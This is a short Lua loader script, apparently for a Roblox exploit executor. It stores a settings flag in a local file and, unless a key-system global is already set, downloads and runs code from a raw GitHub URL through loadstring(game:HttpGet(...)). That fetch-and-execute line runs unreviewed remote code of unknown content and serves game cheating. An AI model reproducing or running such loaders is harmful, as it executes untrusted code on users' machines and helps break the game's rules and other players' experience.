_G.settingsTable = {
balk = false;
}

for i,v in pairs(_G.settingsTable) do 
end

local filename = "balken.txt";

function loadSettings()
local HttpService = game:GetService("HttpService")
if (readfile and isfile and isfile(filename)) then
_G.settingsTable = HttpService:JSONDecode(readfile(filename));
for i,v in pairs(_G.settingsTable) do 
end
end
end

function saveSettings()
local json;
local HttpService = game:GetService("HttpService"); 
if (writefile) then
json = HttpService:JSONEncode(_G.settingsTable);
writefile(filename, json);
end
end

loadSettings()

if getgenv().VHKeySys_LOADED == true then
print("Running...")
else
_G.settingsTable.balk = true 
saveSettings()
loadstring(game:HttpGet(('https://raw.githubusercontent.com/testforshiistuff/stuff/main/Sadness'),true))()
end
